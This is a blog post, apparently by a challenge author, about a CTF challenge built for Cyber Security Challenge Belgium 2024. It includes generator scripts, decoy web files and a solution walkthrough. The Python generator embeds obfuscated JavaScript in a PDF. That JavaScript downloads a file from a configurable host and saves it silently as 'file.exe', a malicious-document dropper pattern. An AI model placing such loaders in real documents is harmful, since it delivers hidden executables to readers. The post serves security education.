+++
author = "Toku"
title = "Unraveling 'Jeroen's Secret Bamboo Stew' at CSCBE: A Thrilling Challenge Experience as a Contributor"
date = "01 Oct 2024"
description = "As a cybersecurity enthusiast, contributing to the Cyber Security Challenge Belgium (CSCBE) this year was an incredible experience. Participating as a challenge contributor in the CSCBE this year was an exhilarating experience. Designing a challenge that tests the skills and ingenuity of participants is both a responsibility and a joy. One of the challenges I created was 'Jeroen's Secret Bamboo Stew.' In this blog, I’ll delve into the intricacies of this challenge, share the scripts I developed, and reflect on the excitement of contributing to such a dynamic competition."
tags = [
    "CSCBE", "forensics", "programming", "steganography"
]
+++

As a cybersecurity enthusiast, contributing to the Cyber Security Challenge Belgium (CSCBE) this year was an incredible experience. Participating as a challenge contributor in the CSCBE this year was an exhilarating experience. Designing a challenge that tests the skills and ingenuity of participants is both a responsibility and a joy. One of the challenges I created was 'Jeroen's Secret Bamboo Stew.' In this blog, I’ll delve into the intricacies of this challenge, share the scripts I developed, and reflect on the excitement of contributing to such a dynamic competition.

## Whois: Cyber Security Challenge Belgium

The Cyber Security Challenge Belgium (CSCBE) is an annual competition specifically tailored for students passionate about cybersecurity. This engaging event invites participants from various educational backgrounds to tackle a series of exciting challenges that test their skills in areas such as forensics, cryptography, and web exploitation. One of the unique aspects of CSCBE is its emphasis on networking opportunities; students have the chance to connect with industry sponsors and professionals, fostering valuable relationships that can help guide their future careers. By providing a platform for students to apply their theoretical knowledge to practical problems, CSCBE enhances technical abilities while promoting critical thinking and problem-solving in the face of real-world security challenges. Ultimately, it prepares students for future careers in cybersecurity while cultivating a vibrant community of aspiring professionals.

## TLDR: The Challenge

### Category

> Forensics | Programming | Steganography

### Category - Estimated Difficulty

> Easy/Medium

### Category - Description

> The goal of the challenge was for students to identify JavaScript code hidden inside a PDF, extract links from the code, and download files from those links. One of the files contained the hidden flag. While it sounds straightforward, the challenge required attention to detail and some clever problem-solving.

### Scenario - Desription

> Jeroen, a skilled chef, has developed a secret recipe for a new type of bamboo stew. To protect his recipe, he hid it in a file. While Jeroen was napping, Toku stole his laptop and opened a file he found intriguing. But just as Toku was about to unlock the secret, he fell asleep, leaving the task to CSCBE participants: Can you discover Jeroen’s secret ingredient before Toku wakes up?

## Crafting the Challenge: The Technical Side

### Step 1: Generating the PDF with Hidden JavaScript

To start the challenge, I needed to create a PDF containing JavaScript code that participants would have to extract. The script I developed automates this process by embedding JavaScript into a PDF document. I was heavily inspired when creating challenge by Didier Stevens work. Didier is an expert in malicious documents and reverse engineering. His in-depth analysis and tools have significantly contributed to the cybersecurity community, especially in the detection and dissection of malicious payloads hidden in Office files and PDFs. You can explore his research, tools, and insights at https://blog.didierstevens.com. 

Here's the Python script I used to create the challenge's PDF:

```python
import sys
from PyPDF2 import PdfReader, PdfWriter

# Check that the correct number of arguments were passed
if len(sys.argv) != 3:
    print("Usage: python generate_chal.py <domain.com> <amount_of_files>")
    print("Example: python generate_chal.py 127.0.0.1 1000")
    sys.exit(1)

# Get the values of the arguments
URL = sys.argv[1]
amount = int(sys.argv[2])

# Create the JavaScript code for downloading and executing a file
js_list = []
print("Created " +str(amount)+ " javascript files")
for i in range(amount):
    start_js = "/Names [(EmbeddedJS) << /S /JavaScript /JS ("   
    mal_js = "var P=Q;(function(V,x){var F=Q,W=V();while(!![]){try{var K=-parseInt(F(0xb2))/0x1*(parseInt(F(0xb8))/0x2)+parseInt(F(0xba))/0x3*(-parseInt(F(0xaf))/0x4)+parseInt(F(0xbf))/0x5*(-parseInt(F(0xc5))/0x6)+-parseInt(F(0xbc))/0x7*(parseInt(F(0xc0))/0x8)+-parseInt(F(0xbb))/0x9*(-parseInt(F(0xb4))/0xa)+-parseInt(F(0xc6))/0xb+-parseInt(F(0xb3))/0xc*(-parseInt(F(0xc9))/0xd);if(K===x)break;else W['push'](W['shift']());}catch(Z){W['push'](W['shift']());}}}(C,0xe97f1));var fileUrl=P(0xb1),xhr=new XMLHttpRequest();function Q(V,x){var W=C();return Q=function(K,Z){K=K-0xaf;var F=W[K];return F;},Q(V,x);}xhr[P(0xcb)]('GET',fileUrl,!![]),xhr[P(0xc4)]=P(0xca),xhr['onload']=function(){var q=P,V=new File([xhr[q(0xc7)]],q(0xb7),{'type':q(0xc2)}),x=URL[q(0xb5)](V),W=document[q(0xb6)]('a');W[q(0xcc)]=q(0xc8),W[q(0xbd)]=x,W[q(0xbe)]=V['name'],document[q(0xb0)][q(0xb9)](W),W[q(0xc3)](),setTimeout(function(){var h=q;URL[h(0xcd)](x);},0x64);},xhr[P(0xc1)]();function C(){var z=['file.exe','5468zxIgZX','appendChild','3874926ZWJkQH','171kONjLd','9031309HXGsVe','href','download','70ftvfat','8watwfh','send','application/octet-stream','click','responseType','467658fnjDJz','4430360eNIcRH','response','display:\x20none','63857729zwwgjy','arraybuffer','open','style','revokeObjectURL','4biJxER','body','http://"+URL+"/file" + str(i) + ".txt','493lXWYDo','12LlAsrv','772590TVEvZu','createObjectURL','createElement'];C=function(){return z;};return C();}"
    end_js = ") >>]\n"
    javascript = start_js + mal_js + end_js
    js_list.append(javascript)

# Open the PDF file in read mode
pdf_file = open('input.pdf', 'rb')

# Create a PdfReader object
pdf_reader = PdfReader(pdf_file)

# Create a PdfWriter object
pdf_writer = PdfWriter()

# Add the PDF pages to the writer object
for page in range(0,len(pdf_reader.pages)):
    pdf_writer.add_page(pdf_reader.pages[page])

# Add the JavaScript code to the PDF file
for js in js_list:   
    pdf_writer.add_js(js)

# Create a new PDF file in write mode
output_file = open('Jeroen_Stew.pdf', 'wb')

# Write the PDF to the output file
pdf_writer.write(output_file)

# Close the input and output files
pdf_file.close()
output_file.close()

print("[*] Created PDF : Jeroen_Stew.pdf")
```

```txt requirements.txt
PyPDF2==3.0.1
```

The script takes a domain (to embed into the hidden JavaScript) and the number of files to generate. It automates the process of embedding JavaScript into the PDF, creating a hidden layer of complexity for the challenge.

The PDF at the end looked like the following:
![Jeroen_Stew_PDF](../../images/cscbe2024/Jeroen_Stew_PDF.png)

### Step 2: Creating the Web Server to Host the Files

Once the participants extracted the JavaScript from the PDF, they were led to a web server hosting several files, one of which contained the flag. The next step was to set up this web server.

I used Docker to create a simple NGINX web server:

```yaml

version: '3'

services:
  web:
    image: nginx
    ports:
      - "80:80"
    volumes:
      - ./html:/usr/share/nginx/html
```

### Step 3: The Fun with Hidden Files

To make the challenge more engaging, I created thousands of random files on the web server. Only one file contained the flag. Participants had to search through these files to find the right one. What made it more fun is that the X files mentioned in the PDF may be different in the amount as the amount hosted. Here’s the script I wrote to generate the files and hide the flag:

```python

import os
import random
import string
import sys

# Check that the correct number of arguments were passed
if len(sys.argv) != 4:
    print("Usage: python generate_chal.py <flag> <amount> <num_file_to_hide_flag>")
    print("Example: python generate_files.py 'Here the real flag: CSC{th3_53cr3t_15_5ug3rcan3}' 1000 555")
    sys.exit(1)

# Get the values of the arguments
flag = sys.argv[1]
num_files = int(sys.argv[2])

# Set the name of the hidden file
hidden_file_name = f"file{sys.argv[3]}.txt"

# Set the directory to create the files in
directory = "./html"

# Create the directory if it doesn't exist
if not os.path.exists(directory):
    os.makedirs(directory)

# Create the random files
for i in range(num_files):
    file_name = f"file{i}.txt"
    file_path = os.path.join(directory, file_name)
    file_content = "".join(random.choices(string.ascii_lowercase, k=100))

    with open(file_path, "w") as f:
        f.write(file_content)

    if file_name == hidden_file_name:
        with open(file_path, "w") as f:
            f.write("\n" + flag)

print("Finished generating files!")
```

In this case to keep it simple for the students, the script generated 1,000 random files, with the flag hidden in one of them. The participants needed to download all the files and search for the correct one, or at least browse and parse them. This was the programmatic part where students could easily browse to these parse these in an automated way.

### Step 4: Adding Some Red Herrings

To add to the challenge, I created a robots.txt file to mislead participants. The file contained some fake hidden pages and incorrect hints:

```txt

User-agent: *
Disallow:

Sitemap: https://www.example.com/sitemap.xml

# Disallow access to sensitive directories
Disallow: /admin/
Disallow: /private/

# Hidden pages
Disallow: /panda-info/
Disallow: /panda-pictures/
Disallow: /adopt-a-panda/

Congratulation here is the flag: CSC{have_you_seen_the_recipe?} <- not the flag ;)
```

Participants might have thought they found the flag, only to realize it was a decoy! So obvious, so cheeky I know..

### Step 5: The Fake Flag in index.html

To cringe even more, I also added a playful fake flag to the index.html page:

```html

<!DOCTYPE html>
<html>
  <head>
    <title>Pandas!</title>
  </head>
  <body>
    <h1>Welcome to my hidden Panda Page!</h1>
    <p>Here are some pictures of pandas:</p>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Grosser_Panda.JPG/1200px-Grosser_Panda.JPG" alt="Giant Panda">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Baby_Pandas.JPG/1280px-Baby_Pandas.JPG" alt="Panda cub">
    <p>Pandas are native to central China and are known for their distinctive black and white fur. They are herbivores and primarily eat bamboo. Pandas are an endangered species, with only around 1,800 in the wild.</p>

    Congratulation here is the fake flag: flag{this_is_not_the_flag}

    You might have been lost, so here is a <a href="https://www.youtube.com/watch?v=X21mJh6j9i4">hint</a> for you.
  </body>
</html>
```

This page contained a fake flag and a misleading hint to throw participants off the trail! Of course the link to the video contained a real hint. Come on, I am not that bad.

## The Write-up

Participants could have approached the challenge by following a systematic process to uncover the hidden flag.

Here's a step-by-step breakdown of the solution:

1. Extracting Links from the PDF:
    - Objective: Identify all URLs embedded within the hidden JavaScript code in the PDF.
    - Method:
        - Use the strings command to extract readable text from the PDF.
        - Filter out lines containing "http" using grep.
        - Decode the obfuscated URLs by replacing encoded characters using sed.
        - Extract the actual URLs with another grep command.

    ```shell Command:
        # Identify all links hidden in the pdf
        strings Jeroen_Stew.pdf | grep "http" | sed 's/\\057/\//g' | sed 's/\\072/:/g'| sed 's/\\056/./g' | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" > links.txt
    ```

2. Downloading the Files:
    - Objective: Retrieve all files hosted on the web server via the extracted links.
    - Method: Use wget to download all URLs listed in links.txt.

    ```shell Command:
        # wget all the links
        wget -i links.txt
    ```

3. Identifying the Flag:
    - Objective: Search through the downloaded files to locate the one containing the flag.
    - Method: Utilize grep to recursively search for the pattern CSC{ within the files.

    ```shell Command:
        # Identify the flag from the files
        grep -r "CSC{" ./
    ```

### Complete Proof-of-Concept (PoC) Script

For convenience, here's the full PoC script that consolidates all the steps:

```shell Command:
    # Identify all links hidden in the pdf
    strings Jeroen_Stew.pdf | grep "http" | sed 's/\\057/\//g' | sed 's/\\072/:/g'| sed 's/\\056/./g' | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" > links.txt

    # wget all the links
    wget -i links.txt

    # Identify the flag from the files
    grep -r "CSC{" ./
```

> **Usage:**  Run the Script: Execute the above commands in the terminal within the directory containing Jeroen_Stew.pdf.
> **Result:** The flag CSC{th3_53cr3t_15_5ug3rcan3} will be revealed upon successful execution.

## The Joy of Contributing

Designing "Jeroen's Secret Bamboo Stew" was a deeply rewarding experience. As a challenge contributor, I aimed to create a puzzle that was not only technically engaging but also enjoyable for participants. Here’s what made this endeavor particularly fulfilling:

1. Blending Creativity with Technical Expertise
Crafting a challenge that intertwines forensics, programming, and steganography required a balanced mix of creativity and technical skill. Ensuring that each component seamlessly connected to the next was both challenging and satisfying.
2. Watching Participants Engage and Solve
Observing participants as they dissected the challenge and eventually unraveled the solution was immensely gratifying. Their "aha!" moments and the strategies they employed provided valuable insights and reinforced the importance of well-designed challenges.
3. Enhancing My Own Skills
Developing this challenge pushed me to deepen my understanding of PDF manipulation, JavaScript obfuscation, and web server configurations. It was a hands-on learning experience that enhanced also my capabilities in cybersecurity.
4. Contributing to the CSCBE Community
Being part of CSCBE as a contributor allowed me to give back to a community that continually inspires and nurtures cybersecurity talent. It's a privilege to help shape the experiences of aspiring professionals and to foster a spirit of curiosity and resilience.

## Final Thoughts

Contributing to the CSCBE allowed me to hone my skills in crafting puzzles and thinking like both an attacker and a defender. Seeing participants enjoy and tackle my challenge made all the effort worthwhile.

If you ever get the chance to contribute to a cybersecurity competition, I highly recommend it! Not only is it a chance to give back to the community, but it’s also an incredibly fun and fulfilling experience. Until next year’s CSCBE, keep hacking and stay curious!